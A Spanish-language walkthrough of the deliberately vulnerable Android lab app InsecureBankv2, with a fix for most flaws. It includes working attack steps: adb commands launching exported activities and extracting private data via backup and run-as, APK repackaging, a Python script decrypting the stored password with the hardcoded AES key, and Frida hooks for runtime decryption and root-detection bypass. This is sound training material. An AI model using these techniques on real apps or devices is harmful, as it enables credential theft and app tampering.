---
title: "InsecureBankv2"
date: 2026-08-20
categories: [Mobile, Android]
tags: [android, mobile, insecurebankv2, adb, frida, mobsf, drozer, apktool, burp-suite, exported-activity, content-provider, insecure-storage, aes, hardcoded-key, allowbackup, debuggable, insecure-logging, webview, clipboard, cleartext-http, user-enumeration, CWE-532]
image:
  path: /assets/img/Mobile/InsecureBankv2/banner.png
  alt: InsecureBankv2 writeup
---

InsecureBankv2 es una aplicación bancaria Android deliberadamente vulnerable que concentra casi todas las malas configuraciones móviles en un solo APK: componentes exportados que saltan el login, credenciales almacenadas bajo una clave AES hardcodeada, `allowBackup` y `debuggable` activados, logging y HTTP en claro, un WebView inyectable y un cambio de contraseña por manipulación de parámetros. Más que una única cadena hasta root, esto es un catálogo de fallos independientes del lado cliente y de configuración, cada uno documentado con su mecanismo, su explotación y su corrección.

| Campo      | Detalles                      |
|------------|-------------------------------|
| Plataforma | InsecureBankv2 (dineshshetty) |
| Tipo       | Aplicación móvil Android       |
| Emulador   | Genymotion — Google Nexus 5X  |
| SO         | Android 11 (API 30)           |
| Fecha      | Agosto 2026                   |

## Herramientas Utilizadas

| Herramienta    | Descripción                                                                       |
|----------------|-----------------------------------------------------------------------------------|
| Genymotion     | Emulador de Android usado para ejecutar el dispositivo objetivo                    |
| adb            | Android Debug Bridge — instala apps, ejecuta comandos de shell, reenvía puertos, extrae ficheros |
| MobSF          | Mobile Security Framework — análisis estático automatizado y decompilación del APK |
| apktool        | Decompila y reconstruye APKs, decodificando recursos y smali                       |
| keytool        | Genera el keystore RSA usado para firmar el APK reconstruido                       |
| zipalign       | Alinea las entradas del APK a límites de 4 bytes para una carga óptima             |
| apksigner      | Firma y verifica el APK reconstruido                                               |
| Frida          | Toolkit de instrumentación dinámica — hookea y reescribe métodos en tiempo de ejecución |
| pidcat         | Wrapper de `logcat` por aplicación con salida coloreada                            |
| android-backup-extractor (abe) | Convierte los archivos de backup `.ab` de Android en ficheros tar estándar |
| sqlite3        | Lee las bases de datos SQLite de la app                                            |
| Burp Suite     | Proxy de interceptación usado para leer y manipular el tráfico HTTP de la app      |
| pycryptodome   | Implementación AES en Python usada para descifrar la contraseña almacenada offline |

## Configuración y Despliegue

El objetivo de esta fase fue levantar el objetivo: un dispositivo virtual de Genymotion ejecutando la app, comunicándose con el servidor backend AndroLab en el host.

Siguiendo la guía de uso del autor, emulé un **Google Nexus 5X** con **Android 11 (API 30)** en Genymotion. El dispositivo arranca en un launcher de serie, y el adaptador host-only lo coloca en la red `192.168.56.0/24` — la dirección que la app y el backend usarán para alcanzarse mutuamente.

![Dispositivo virtual Genymotion Nexus 5X arrancado en el launcher](/assets/img/Mobile/InsecureBankv2/cap1.png)

La aplicación incluye un backend en Python (AndroLab). Está hecho para Python 2.7, así que lo ejecuté dentro de un virtualenv dedicado:

```bash
(.venv2) ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2/AndroLabServer$ python app.py
The server is hosted on port: 8888
```

Con el servidor escuchando en `8888`, me conecté al dispositivo por adb e instalé el APK. El detalle clave aquí es `adb reverse`, que mapea un puerto del dispositivo de vuelta al host — de modo que cuando la app marque luego a `8888`, el dispositivo reenvía esa conexión al servidor AndroLab que corre en mi máquina.

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb devices
List of devices attached
192.168.56.101:5555	device

ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb reverse tcp:8888 tcp:8888
8888

ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb install InsecureBankv2.apk
Performing Streamed Install
Success
```

Dado que `adb` conduce casi cada paso de este writeup, conviene fijar qué hace cada invocación. `adb` es el puente por línea de comandos hacia un dispositivo o emulador Android; los subcomandos usados a lo largo del writeup son:

- `adb devices` — lista los dispositivos conectados por su `ip:port` (Genymotion expone el dispositivo por TCP).
- `adb reverse tcp:8888 tcp:8888` — reenvío inverso de puerto: las conexiones que el **dispositivo** hace a `localhost:8888` se tunelizan a `localhost:8888` en el **host**. La imagen espejo de `adb forward`.
- `adb install <apk>` — instala un APK en el dispositivo.
- `adb shell <cmd>` — ejecuta un comando dentro de la shell Unix del dispositivo (o abre una shell interactiva sin argumento).
- `adb pull <remote> <local>` / `adb exec-out <cmd>` — copia ficheros desde el dispositivo; `exec-out` transmite binario en crudo sin la conversión de fin de línea que introduce `adb shell`.
- `adb push <local> <remote>` — copia ficheros al dispositivo.
- `adb backup <pkg>` — dispara un backup completo de los datos privados de una app.
- `adb uninstall <pkg>` — desinstala una app.

El laboratorio proporciona dos juegos de credenciales válidas:

- `dinesh:Dinesh@123$`
- `jack:Jack@123$`

Dentro de la app, apunté las preferencias de red al IP del servidor `192.168.56.1` en el puerto `8888` y me logué como `dinesh` para confirmar que el dispositivo y el backend se estaban comunicando.

![Pantalla de login de InsecureBankv2 con los botones Login y Autofill Credentials](/assets/img/Mobile/InsecureBankv2/cap2.png)

## Análisis Estático con MobSF

El objetivo aquí fue decompilar el APK una sola vez y obtener un inventario de un vistazo de la superficie de ataque — permisos, componentes exportados y los flags del manifest — antes de tocar ninguna vulnerabilidad concreta.

MobSF automatiza la decompilación, el parseo del manifest y la detección de problemas a nivel de código fuente. Lo ejecuté como contenedor, apuntando su analizador dinámico a la instancia de Genymotion en marcha:

```bash
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it --name mobsf --network host \
  -e MOBSF_ANALYZER_IDENTIFIER=192.168.56.101:5555 \
  opensecurity/mobile-security-framework-mobsf:latest
```

Con el contenedor levantado, accedí a `localhost:8000` (credenciales por defecto `mobsf:mobsf`) y subí `InsecureBankv2.apk`. El dashboard revela de inmediato la forma del problema: una puntuación de seguridad baja y — lo más importante — un recuento de **componentes exportados**.

![Dashboard de análisis estático de MobSF mostrando actividades, receivers y providers exportados](/assets/img/Mobile/InsecureBankv2/cap3.png)

MobSF reporta **4 actividades exportadas, 1 receiver exportado y 1 content provider exportado**. En Android, un componente marcado `exported="true"` (o uno con un intent filter y sin `exported=false` explícito) puede ser invocado por **cualquier otra app del dispositivo**. Ese único hecho impulsa varias de las vulnerabilidades de abajo.

Ver el `AndroidManifest.xml` decodificado confirma los dos flags de aplicación más peligrosos y los componentes exportados:

```xml
<application android:allowBackup="true" android:debuggable="true" ...>
    <activity android:name="com.android.insecurebankv2.LoginActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>
    <activity android:exported="true" android:name="com.android.insecurebankv2.PostLogin"/>
    <activity android:exported="true" android:name="com.android.insecurebankv2.DoTransfer"/>
    <activity android:exported="true" android:name="com.android.insecurebankv2.ViewStatement"/>
    <provider android:authorities="com.android.insecurebankv2.TrackUserContentProvider"
              android:exported="true"
              android:name="com.android.insecurebankv2.TrackUserContentProvider"/>
    <receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
        <intent-filter>
            <action android:name="theBroadcast"/>
        </intent-filter>
    </receiver>
    <activity android:exported="true" android:name="com.android.insecurebankv2.ChangePassword"/>
</application>
```

Dos flags saltan a la vista de inmediato, y ambos alimentan secciones dedicadas más adelante: `android:allowBackup="true"` y `android:debuggable="true"`. Junto a ellos, `PostLogin`, `DoTransfer`, `ViewStatement`, `ChangePassword`, el `TrackUserContentProvider` y el `MyBroadCastReceiver` son todos alcanzables desde fuera de la app.

## Bypass del Login por Actividad

**Objetivo**: llegar al área autenticada de la app sin aportar credenciales válidas.

Una *actividad* de Android es una única pantalla de la interfaz. Normalmente el propio flujo de la app decide qué actividad viene a continuación — solo se puede llegar a `PostLogin` después de que `LoginActivity` valide las credenciales. Pero `PostLogin` está exportada, y las actividades exportadas pueden lanzarse directamente por cualquiera, cortocircuitando la lógica que se suponía debía controlarlas.

El nombre es una pista clara: "PostLogin" es la pantalla que se muestra *después* del login. La lancé directamente desde adb:

```bash
adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```

Aquí `am` es el Activity Manager del dispositivo y `start -n <package>/<component>` lanza una actividad concreta por su nombre completamente cualificado. La pantalla que aparece — Transfer, View Statement, Change Password — es exactamente el dashboard posterior a la autenticación, alcanzado sin haber pasado nunca por el formulario de login.

![Actividad PostLogin alcanzada directamente, mostrando Transfer, View Statement y Change Password](/assets/img/Mobile/InsecureBankv2/cap4.png)

**Corrección**: marca como `android:exported="false"` las actividades que solo deban ser alcanzables internamente, y nunca dependas del orden de las actividades como frontera de autenticación. La autorización debe imponerla la propia actividad (una comprobación de sesión en `onCreate`), no la suposición de que el usuario "tuvo que" venir de la pantalla de login.

## Content Provider Exportado

**Objetivo**: leer la base de datos interna de seguimiento de usuarios de la app desde fuera de la app.

Un content provider es el mecanismo de Android para compartir datos estructurados (normalmente respaldados por SQLite) entre apps. `TrackUserContentProvider` está exportado, y su código muestra que envuelve una tabla `names` dentro de la base de datos `mydb`:

```java
public class TrackUserContentProvider extends ContentProvider {
    static final String CREATE_DB_TABLE = " CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL);";
    static final String DATABASE_NAME = "mydb";
    static final String TABLE_NAME = "names";
    static final String URL = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers";
    ...
}
```

Como el provider está exportado sin declarar permiso de lectura, cualquier app del dispositivo puede consultarlo mediante su URI `content://` y extraer la lista de usuarios que se han logueado — nombres de usuario que nunca deberían haber salido del sandbox de la app. La misma tabla `names` reaparece más adelante, extraída a través de otros dos fallos independientes (backup y `run-as`), lo cual es un tema recurrente en esta app: un único dato sensible, varias puertas sin proteger hacia él.

**Corrección**: no exportes content providers salvo que compartir entre apps sea un requisito real. Cuando lo sea, protege lecturas y escrituras tras un permiso a nivel de firma y valida el paquete que llama.

## Patcheo del APK — Botón Oculto "Create User"

**Objetivo**: forzar la aparición de un elemento de interfaz oculto solo para admin manipulando un recurso estático empaquetado dentro del APK.

`LoginActivity.onCreate()` lee un recurso string llamado `is_admin` y oculta el botón "Create User" cuando vale `"no"`:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_log_main);
    String mess = getResources().getString(R.string.is_admin);
    if (mess.equals("no")) {
        View button_CreateUser = findViewById(R.id.button_CreateUser);
        button_CreateUser.setVisibility(8);   // 8 = View.GONE
    }
    ...
}
```

El detalle crucial es *dónde* vive `is_admin`. No es un flag del lado servidor ni nada que viaje por la red — es un **recurso estático hardcodeado dentro del APK** en `/res/values/strings.xml`, siempre igual a `"no"`. Cualquier cosa hardcodeada en el APK está completamente bajo el control de un atacante, porque el APK no es más que un fichero en disco que puede desempaquetarse, editarse y reempaquetarse.

Decompilé el APK con apktool:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ apktool d InsecureBankv2.apk -o InsecureBankv2_patched
I: Using Apktool 2.7.0-dirty on InsecureBankv2.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Baksmaling classes.dex...
I: Copying assets and libs...
```

`apktool d <apk> -o <dir>` decodifica el APK en una carpeta: los recursos se convierten de nuevo en XML legible y el bytecode Dalvik en smali. El string `is_admin` estaba exactamente donde el código sugería:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ cat InsecureBankv2_patched/res/values/strings.xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello world!</string>
    <string name="is_admin">no</string>
    <string name="loginscreen_password">Password:</string>
</resources>
```

Cambié el valor a `yes` y reconstruí el APK:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ apktool b InsecureBankv2_patched -o InsecureBankv2_patched.apk
I: Using Apktool 2.7.0-dirty
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Built apk into: InsecureBankv2_patched.apk
```

Android se niega a instalar un APK sin firmar, y como el certificado de firma cambia, también se niega a *actualizar* la instalación existente — así que primero hay que eliminar la copia antigua. El flujo de firma moderno es alinear-luego-firmar con `apksigner` (zipalign va *antes* de firmar, a diferencia del flujo legacy con jarsigner):

```bash
# a) Crear un keystore (una sola vez). Apunta la contraseña.
keytool -genkey -v -keystore mi.keystore -alias miclave \
  -keyalg RSA -keysize 2048 -validity 10000

# b) Alinear a límites de 4 bytes ANTES de firmar
zipalign -p -f -v 4 InsecureBankv2_patched.apk InsecureBankv2_aligned.apk

# c) Firmar
apksigner sign --ks mi.keystore --ks-key-alias miclave \
  --out InsecureBankv2_signed.apk InsecureBankv2_aligned.apk

# d) Verificar la firma
apksigner verify --verbose InsecureBankv2_signed.apk
```

- `keytool -genkey` construye un keystore RSA-2048 autofirmado válido durante 10000 días.
- `zipalign -p -f -v 4` alinea las entradas a límites de 4 bytes (`-p` para librerías compartidas alineadas a página, `-f` sobrescribe, `-v` verbose).
- `apksigner sign` firma el APK alineado con la clave del keystore.
- `apksigner verify` confirma que la firma es válida.

Finalmente, desinstalar la original e instalar la build patcheada:

```bash
adb uninstall com.android.insecurebankv2
adb install InsecureBankv2_signed.apk
```

El botón "Create User" ahora se renderiza en la pantalla de login:

![Pantalla de login mostrando ahora el botón Create User previamente oculto](/assets/img/Mobile/InsecureBankv2/cap5.png)

Honestidad sobre el impacto: el botón es cosmético. Su handler es un stub:

```java
protected void createUser() {
    Toast.makeText(this, "Create User functionality is still Work-In-Progress!!", 1).show();
}
```

Así que esto no es una escalada de privilegios — es una demostración de que **los flags del lado cliente no son una frontera de seguridad**. Cualquier decisión que el cliente tome basándose en un valor que él mismo distribuye (feature gating, toggles de "admin", comprobaciones de licencia) puede invertirse reempaquetando. La lección generaliza mucho más allá de este stub.

**Corrección**: nunca condiciones comportamiento relevante para la seguridad a recursos del lado cliente o a estado provisto por el cliente. Las decisiones de autorización pertenecen al servidor, que el cliente no puede reescribir.

## Backdoor de Login de Desarrollador

**Objetivo**: autenticarse como una cuenta privilegiada sin conocer ninguna contraseña.

El método `postData()` de `DoLogin` construye dos endpoints HTTP — el normal `/login` y un segundo `/devlogin` — y enruta al segundo siempre que el nombre de usuario sea `devadmin`:

```java
HttpPost httppost  = new HttpPost(... + "/login");
HttpPost httppost2 = new HttpPost(... + "/devlogin");
...
if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);   // dev endpoint
} else {
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost);
}
```

El endpoint `/devlogin` acepta al usuario `devadmin` con **cualquier contraseña**. Loguearse a través de la app como `devadmin` con una contraseña arbitraria funciona, y el servidor lo confirma:

```json
{"message": "Correct Credentials", "user": "devadmin"}
```

Este es un backdoor de desarrollador clásico: un atajo dejado para pruebas que nunca se eliminó. La lógica de enrutamiento reside enteramente en el lado cliente en el código decompilado, así que incluso sin saber que el endpoint existía, leer `DoLogin.java` lo revela.

**Corrección**: elimina las rutas de autenticación de desarrollo/pruebas antes del release, y nunca distribuyas un endpoint que salte la verificación de credenciales. Los backdoors invariablemente sobreviven al sprint en el que se añadieron.

## Almacenamiento Inseguro de Credenciales

**Objetivo**: recuperar la contraseña en claro de un usuario desde el almacenamiento local de la app, derrotando el "cifrado" que el desarrollador creía que la protegía.

Cuando un login tiene éxito, `DoLogin.saveCreds()` persiste las credenciales en un fichero `SharedPreferences`: el usuario se codifica en Base64 y la contraseña pasa por `CryptoClass.aesEncryptedString()`:

```java
private void saveCreds(String username, String password) throws ... {
    SharedPreferences mySharedPreferences = DoLogin.this.getSharedPreferences("mySharedPreferences", 0);
    SharedPreferences.Editor editor = mySharedPreferences.edit();
    ...
    String base64Username = new String(Base64.encodeToString(this.rememberme_username.getBytes(), 4));
    CryptoClass crypt = new CryptoClass();
    this.superSecurePassword = crypt.aesEncryptedString(this.rememberme_password);
    editor.putString("EncryptedUsername", base64Username);
    editor.putString("superSecurePassword", this.superSecurePassword);
    editor.commit();
}
```

El botón "Autofill Credentials" de la pantalla de login ejecuta el proceso inverso: lee `mySharedPreferences`, decodifica el usuario en Base64 y descifra la contraseña para rellenar el formulario. Para encontrar el fichero me logué como `jack` (`jack:Jack@123$`) y busqué en el sistema de ficheros:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb shell
vbox86p:/ # find / -name "mySharedPreferences*" 2>/dev/null
/data/user/0/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
/data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml

vbox86p:/ # cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">v/sJpihDCo2ckDmLW5Uwiw==&#10;    </string>
    <string name="EncryptedUsername">amFjaw==&#13;&#10;    </string>
</map>
```

El usuario se recupera trivialmente — `amFjaw==` es Base64 de `jack`. La contraseña es el texto cifrado AES `v/sJpihDCo2ckDmLW5Uwiw==`. MobSF sacó a la luz la clase responsable, `CryptoClass.java`, y su código es el problema entero:

![Vista de código de MobSF de CryptoClass.java mostrando la clave hardcodeada y el IV estático](/assets/img/Mobile/InsecureBankv2/cap6.png)

```java
public class CryptoClass {
    String key = "This is the super secret key 123";
    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    ...
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
}
```

Dos anti-patrones criptográficos fatales viven en esas dos líneas. La **clave está hardcodeada** dentro de la app (`"This is the super secret key 123"`, 32 bytes → AES-256), por lo que se distribuye con cada copia del APK y es idéntica para cada usuario. El **IV es un bloque estático de bytes cero**, lo que significa que textos planos idénticos producen siempre textos cifrados idénticos. Un cifrado cuya clave es pública y cuyo IV es constante no proporciona confidencialidad alguna — es ofuscación, no criptografía. Cualquiera que lea la clase (o decompile el APK) tiene todo lo necesario para descifrar todas las contraseñas almacenadas en todos los dispositivos.

### Método 1 — Descifrado offline con Python

Conociendo la clave, el IV y el modo CBC, el descifrado son unas pocas líneas con `pycryptodome`:

```python
ander@monre:~/mobileHack/InsecureBankV2$ cat decryptor.py
from Crypto.Cipher import AES
from base64 import b64decode

iv = 16 * b'\x00'
key = b'This is the super secret key 123'

username = b64decode("amFjaw==").decode()
encrypted_password = b64decode("v/sJpihDCo2ckDmLW5Uwiw==")

cipher = AES.new(key, AES.MODE_CBC, iv)
password = cipher.decrypt(encrypted_password).decode()

print(f"{username}:{password}")

ander@monre:~/mobileHack/InsecureBankV2$ python3 decryptor.py
jack:Jack@123$
```

`Crypto` viene del paquete `pycryptodome` (`pip install pycryptodome`), no de la librería estándar — un `ModuleNotFoundError: No module named 'Crypto'` significa simplemente que no está instalado. El script decodifica en Base64 ambos campos, reconstruye el cipher exacto que usó la app, y recupera `Jack@123$` en claro.

### Método 2 — Descifrado en tiempo de ejecución con Frida

El script offline necesita la clave y el IV. Una técnica más potente no los necesita en absoluto: en lugar de reimplementar la criptografía, **hacemos que la app descifre por nosotros** usando su propio material de clave. `CryptoClass.aesDeccryptedString(String)` toma un texto cifrado y devuelve el texto plano; con Frida lo hookeé de forma que, cuando la app lo llame (al pulsar "Autofill Credentials"), ignore su argumento real y descifre *nuestro* texto cifrado en su lugar:

```javascript
Java.perform(function () {
    var Crypto = Java.use("com.android.insecurebankv2.CryptoClass");

    // el password cifrado (base64) que sacaste de mySharedPreferences
    var encrypted = "v/sJpihDCo2ckDmLW5Uwiw==";

    Crypto.aesDeccryptedString.implementation = function (arg) {
        console.log("[+] argumento original de la app: " + arg);
        console.log("[+] lo sustituyo por: " + encrypted);

        // call the ORIGINAL method with OUR argument
        var result = this.aesDeccryptedString(encrypted);

        console.log("[+] PASSWORD DESCIFRADO: " + result);
        return result;
    };
});
```

La línea importante es `this.aesDeccryptedString(encrypted)`: a diferencia de un hook que fabrica un valor de retorno, este llama al método *real* — reutilizando de forma transparente la clave hardcodeada de la app — pero le pasa el texto cifrado de la víctima. (La preparación del servidor de Frida de la que depende esto se cubre en la sección de Bypass de Detección de Root más abajo.) Ejecutándolo y pulsando "Autofill Credentials":

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida -U -n InsecureBankv2 -l decrypt.js
     ____
    / _  |   Frida 17.17.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |
   . . . .   Connected to Nexus 5X (id=192.168.56.102:5555)

[Nexus 5X::InsecureBankv2 ]-> [+] argumento original de la app: v/sJpihDCo2ckDmLW5Uwiw==
[+] lo sustituyo por: v/sJpihDCo2ckDmLW5Uwiw==
[+] PASSWORD DESCIFRADO: Jack@123$
```

Los dos métodos llegan al mismo resultado desde direcciones opuestas: uno reimplementa el cipher offline, el otro toma prestada la rutina de descifrado de la propia app en tiempo de ejecución. El enfoque de Frida es el más general — funciona incluso cuando la clave *no* es trivialmente legible, porque nunca necesitas conocerla.

**Corrección**: nunca hardcodees claves ni uses IVs estáticos. El material sensible debe almacenarse usando el Android Keystore (respaldado por hardware donde esté disponible), con claves generadas por dispositivo y nunca embebidas en el APK. Las contraseñas en particular no deberían almacenarse de forma recuperable en absoluto.

## Backup de la Aplicación Habilitado

**Objetivo**: exfiltrar todo el directorio de datos privado de la app sin root, mediante el mecanismo de backup de Android.

El manifest deja `android:allowBackup="true"`. Este atributo vale `true` por **defecto** si el desarrollador no lo pone explícitamente a `false`, y permite que cualquiera con acceso al dispositivo y depuración USB vuelque el directorio de datos privado de la app (`/data/data/com.android.insecurebankv2/`) — normalmente aislado en el sandbox e inaccesible — a través del canal legítimo `adb backup`.

```bash
adb backup com.android.insecurebankv2
```

Esto lanza un diálogo de confirmación en el dispositivo, que opcionalmente permite establecer una contraseña para cifrar el backup (apúntala — la necesitas para desempaquetar). Confirmé la operación:

![Diálogo de confirmación de backup completo de Android con campo de contraseña de cifrado](/assets/img/Mobile/InsecureBankv2/cap7.png)

El resultado es un fichero `backup.ab`. Ese formato no es un tar plano — tiene una cabecera específica de Android y puede ir comprimido/cifrado — así que lo convertí con [android-backup-extractor](https://github.com/nelenkov/android-backup-extractor), aportando la contraseña del backup:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ java -jar abe-38fd634.jar unpack backup.ab application-data.tar ander123
Calculated MK checksum (use UTF-8: true): 148018AA7D5C008DAE90B76DB1658CD87C666C4A675DE5DD2B42748B9EB1B2DA
22% 45% 58% 64% 67% 77%
27136 bytes written to application-data.tar.
```

`java -jar abe.jar unpack <in.ab> <out.tar> <password>` convierte el `.ab` en un tar estándar, que luego se extrae con normalidad:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ tar xvf application-data.tar
apps/com.android.insecurebankv2/_manifest
apps/com.android.insecurebankv2/db/mydb-journal
apps/com.android.insecurebankv2/db/mydb
apps/com.android.insecurebankv2/sp/com.android.insecurebankv2_preferences.xml
apps/com.android.insecurebankv2/sp/mySharedPreferences.xml
```

El backup contiene tanto `mySharedPreferences.xml` (el usuario en Base64 y la contraseña AES de la sección anterior) como la base de datos SQLite `mydb` (la tabla de seguimiento de usuarios). Este es el mismo botín alcanzable a través del content provider y de `run-as`, obtenido aquí sin ningún requisito de root — solo acceso físico y depuración USB.

Una nota de realismo que merece la pena registrar: en **Android 12+ (API 31)**, `adb backup` ignora los datos de la app por defecto incluso con `allowBackup=true`, así que este ataque solo funciona en el objetivo más antiguo de Android 11 usado aquí. El flag sigue siendo un finding válido (defensa en profundidad, MASVS-STORAGE), pero su explotabilidad real depende de la versión del SO del objetivo — un buen ejemplo de capacidad frente a explotabilidad práctica.

**Corrección**: pon `android:allowBackup="false"`. Para datos que sí deban respaldarse en la nube, usa reglas `fullBackupContent` para excluir ficheros sensibles, y nunca almacenes credenciales en claro ni bajo una clave recuperable.

## Modo Debug Habilitado

**Objetivo**: leer los ficheros privados de la app asumiendo la propia identidad de la app, usando el binario `run-as` que `debuggable=true` desbloquea.

El manifest también deja `android:debuggable="true"`. A diferencia de `allowBackup`, este vale `false` por defecto — las herramientas de build lo ponen automáticamente en modo release — así que su presencia significa que un desarrollador lo dejó activado a mano. Desbloquea dos cosas: ejecutar comandos *como la app* vía `run-as`, y adjuntar un debugger Java por JDWP. Esta sección cubre lo primero (la vía del debugger no fue necesaria aquí).

El sandbox de Android da a cada app su propio UID de Linux y hace `/data/data/<pkg>/` accesible solo por ese UID. El binario `run-as` permite ejecutar comandos con el UID de una app **siempre que la app sea debuggable** — comprueba ese flag antes de permitir la suplantación. Como está activado aquí, `run-as` me deja directamente en el directorio privado de la app:

```bash
1|vbox86p:/ # run-as com.android.insecurebankv2
vbox86p:/data/user/0/com.android.insecurebankv2 $ ls -la
total 56
drwxr-x--x   6 u0_a130 u0_a130        4096 2026-08-19 16:23 .
drwxrwx--x 167 system  system        12288 2026-08-19 16:15 ..
drwxrws--x   2 u0_a130 u0_a130_cache  4096 2026-08-19 16:15 cache
drwxrws--x   2 u0_a130 u0_a130_cache  4096 2026-08-19 16:15 code_cache
drwxrwx--x   2 u0_a130 u0_a130        4096 2026-08-19 16:16 databases
drwxrwx--x   2 u0_a130 u0_a130        4096 2026-08-19 16:49 shared_prefs
```

Desde aquí extraje la base de datos `mydb` a mi máquina. Usar `exec-out` en lugar de un `adb shell` cat normal importa — transmite los bytes en crudo sin corromper el fichero SQLite con la traducción de fin de línea:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb exec-out run-as com.android.insecurebankv2 cat databases/mydb > mydb
```

Abrir la base de datos confirma la tabla de seguimiento de usuarios — la misma tabla `names` expuesta por el content provider:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ sqlite3 mydb
SQLite version 3.46.1 2024-08-13 09:16:08
sqlite> .tables
android_metadata  names
sqlite> select * from names;
1|devadmin
2|devadmin
3|jack
sqlite> select * from android_metadata;
en_US
```

`run-as` (vía debuggable), `adb backup` (vía allowBackup) y el content provider convergen todos en este mismo dato — tres malas configuraciones independientes, un único conjunto de secretos. Esa redundancia es la verdadera lección: una app móvil fortificada contra un camino pero no contra los otros no está fortificada en absoluto.

**Corrección**: pon `android:debuggable="false"` (o simplemente omítelo y compila siempre en modo release). Un check de CI que rechace cualquier build con `debuggable=true` en el manifest atrapa esto antes de que se distribuya.

## Bypass de Detección de Root con Frida

**Objetivo**: derrotar la comprobación de detección de root de la app en tiempo de ejecución reescribiendo los métodos que la implementan.

Tras un login exitoso, `PostLogin` muestra "Rooted Device!!" — el emulador está rooteado, y la app lo detecta vía `doesSUexist()` y `doesSuperuserApkExist()`. Si alguno devuelve `true`, se muestra el aviso. El plan es hookear ambos y forzar `false`.

Primero, el servidor de Frida tiene que correr en el dispositivo. Frida tiene dos mitades que deben coincidir en versión: `frida-tools` en el host, y `frida-server` (un binario root) en el dispositivo. Comprobé la arquitectura del dispositivo y descargué la build del servidor correspondiente:

```bash
adb shell getprop ro.product.cpu.abi
x86_64
```

La ABI `x86_64` (un emulador Genymotion) determina qué binario del servidor descargar — debe coincidir tanto con la arquitectura como con la versión de Frida del host (17.17.0). Tras descomprimirlo, lo empujé, le di permisos de ejecución y lo lancé como root en segundo plano:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb push frida-server /data/local/tmp/
frida-server: 1 file pushed, 0 skipped. 231.2 MB/s (111587168 bytes in 0.460s)

ander@monre:~/mobileHack/InsecureBankV2$ adb shell "chmod 755 /data/local/tmp/frida-server"
ander@monre:~/mobileHack/InsecureBankV2$ adb shell "su -c '/data/local/tmp/frida-server &'"

ander@monre:~/mobileHack/InsecureBankV2$ adb shell ps -A | grep frida
root           2760      1 11919096 140900 poll_schedule_timeout 7428a25b9a0a S frida-server
```

- `adb push` copia el binario a `/data/local/tmp/` (una ubicación escribible y ejecutable).
- `chmod 755` activa el bit de ejecución.
- `su -c '... &'` lo ejecuta como root en segundo plano (Frida necesita root para inyectar en otros procesos).

Desde el host, `frida-ps -U` confirma que el cliente puede hablar con el servidor (`-U` selecciona el transporte USB/emulador). Es necesario un grep insensible a mayúsculas porque Frida lista el *nombre visible* `InsecureBankv2`, no el paquete en minúsculas:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida-ps -U | grep -i insecure
2585  InsecureBankv2
```

El script del hook reemplaza las implementaciones de ambos métodos booleanos. Como el resultado que la app espera es simplemente "no rooteado", no llamamos a los originales en absoluto — devolvemos `false` directamente:

```javascript
Java.perform(function () {
    var PostLogin = Java.use("com.android.insecurebankv2.PostLogin");

    PostLogin.doesSUexist.implementation = function () {
        console.log("[+] doesSUexist() interceptado -> false");
        return false;
    };

    PostLogin.doesSuperuserApkExist.implementation = function () {
        console.log("[+] doesSuperuserApkExist() interceptado -> false");
        return false;
    };
});
```

`Java.perform` ejecuta el código en el hilo de la VM; `Java.use` carga una clase; reasignar `.implementation` sustituye el cuerpo entero del método. Me adjunté a la app en marcha con `-n` (la comprobación de root se dispara *después* del login, así que adjuntarse a tiempo es sencillo):

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida -U -n InsecureBankv2 -l root_bypass.js
     ____
    / _  |   Frida 17.17.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |
   . . . .   Connected to Nexus 5X (id=192.168.56.102:5555)

[Nexus 5X::InsecureBankv2 ]->
```

Tras loguearme con el hook cargado, la app ahora reporta "Device not Rooted!!":

![PostLogin mostrando ahora Device not Rooted tras el hook de Frida](/assets/img/Mobile/InsecureBankv2/cap8.png)

El punto más amplio: **la detección de root del lado cliente siempre puede neutralizarse en un dispositivo que el atacante controla.** Sube ligeramente el listón pero nunca es un control de seguridad — el código que la impone corre en el mismo proceso que el atacante está instrumentando.

